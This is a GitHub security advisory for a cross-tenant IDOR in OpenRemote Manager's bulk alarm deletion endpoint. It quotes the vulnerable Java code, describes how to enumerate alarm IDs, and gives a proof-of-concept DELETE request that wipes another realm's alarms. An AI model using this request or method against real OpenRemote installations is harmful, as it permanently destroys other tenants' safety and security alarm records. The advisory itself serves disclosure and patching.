# [C] OpenRemote Manager: removeAlarms cross-realm IDOR (bulk delete)

## Summary
Severity: Critical
Advisory: GHSA-h3m5-97jq-qjrf
CVE: CVE-2026-57168
CWE: CWE-639
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-h3m5-97jq-qjrf
Type: github-advisory

## Affected
- Maven: `io.openremote:openremote-manager` — affected >=0 <1.25.0

## Details
### Summary
OpenRemote Manager is vulnerable to a cross-tenant Insecure Direct
Object Reference (IDOR) in the bulk alarm deletion endpoint. An
authenticated user in any realm can delete alarms belonging to other
realms (tenants) by supplying arbitrary alarm IDs. The vulnerability
exists because the bulk removeAlarms() method only verifies that the
caller's own realm is active and accessible, but never checks whether
the targeted alarm IDs belong to the caller's realm before deleting
them.

This allows any user with alarm write permissions in their own realm
to permanently destroy alarm records — including safety-critical and
security alerts — belonging to any other tenant on the same OpenRemote
installation.

------------------------------------------

[Additional Information]
The singular removeAlarm() method correctly validates that the
target alarm's realm matches the caller's access:

    // CORRECT (singular):
    SentAlarm alarm = alarmService.getAlarm(alarmId);
    if (!isRealmActiveAndAccessible(alarm.getRealm())) {
        throw new ForbiddenException(...);
    }

The plural removeAlarms() method is missing this per-alarm realm
check and only validates the caller's own realm — a check that is
trivially satisfied for any authenticated user:

```
 // VULNERABLE (plural):
public void removeAlarms(RequestParams requestParams, List<Long> alarmIds) {
    if (!isRealmActiveAndAccessible(getAuthenticatedRealmName())) {  
        throw new ForbiddenException(...);  // always passes for any auth user
    }
    List<SentAlarm> alarms = alarmService.getAlarms(alarmIds);  // no realm filter
    alarmService.removeAlarms(alarms, alarmIds);                // no realm filter
}

```
The underlying service queries contain no realm scoping:

   ```
 // AlarmService.getAlarms(List<Long>):
    "select sa from SentAlarm sa where sa.id in :ids"
    // no realm filter

    // AlarmService.removeAlarms():
    "delete from SentAlarm sa where sa.id in :ids"
    // no realm filter

```
Alarm IDs are sequential auto-increment Long values (JPA
@GeneratedValue), making them trivially enumerable.

[Vulnerability Type]
Insecure Direct Object Reference (IDOR) / Missing Authorization
CWE-639: Authorization Bypass Through User-Controlled Key
CWE-862: Missing Authorization

------------------------------------------

[Vendor of Product]
OpenRemote Inc. (openremote.io)

------------------------------------------

[Affected Product Code Base]
OpenRemote Manager - current version as of 2026
(github.com/openremote/openremote)

------------------------------------------

[Affected Component]
org.openremote.manager.alarm.AlarmResourceImpl#removeAlarms()
org.openremote.manager.alarm.AlarmService#getAlarms(List<Long>)
org.openremote.manager.alarm.AlarmService#removeAlarms()

File: manager/src/main/java/org/openremote/manager/alarm/AlarmResourceImpl.java
File: manager/src/main/java/org/openremote/manager/alarm/AlarmService.java

------------------------------------------

[Attack Type]
Remote (authenticated)

------------------------------------------

[CVE Impact Other]
Cross-tenant permanent destruction of alarm records, including
safety-critical and security alerts in IoT environments. Also enables
cross-tenant alarm enumeration (presence disclosure of alarm IDs
across all tenants).

------------------------------------------

[Attack Vectors]
1. Attacker registers or obtains any low-privilege account in any realm
   on the target OpenRemote installation (or uses an existing account).
2. Attacker enumerates alarm IDs belonging to other realms by sending
   bulk delete requests with sequential IDs (presence confirmed by
   404 vs 200 response codes).
3. Attacker issues a single bulk delete request containing IDs of
   alarms belonging to victim realm(s).
4. Alarms are permanently deleted with no authorization error.

PoC:

```
Tenant A (attacker) : realm = "tenant-a"
                      user  = attacker@tenant-a.com
                      role  = WRITE_ALARMS_ROLE

Tenant B (victim)   : realm = "tenant-b"
                      alarms with IDs 1174,1173, 1180 exist
```



```
DELETE /api/smartcity/alarm HTTP/2
Content-Type: application/json


[1174,1173, 1180]  /// <- alarm ID 
```

<img width="1280" height="404" alt="image" src="https://github.com/user-attachments/assets/ffbebea2-2248-42a0-bb22-7a0dc51c78ce" />

## References
- https://github.com/openremote/openremote/security/advisories/GHSA-h3m5-97jq-qjrf
- https://github.com/openremote/openremote/commit/9fad55e5a448c82772d241d395826e5d6fe1ce2d
- https://github.com/openremote/openremote
- https://github.com/openremote/openremote/blob/master/manager/src/main/java/org/openremote/manager/alarm/AlarmResourceImpl.java
- https://github.com/openremote/openremote/blob/master/manager/src/main/java/org/openremote/manager/alarm/AlarmService.java
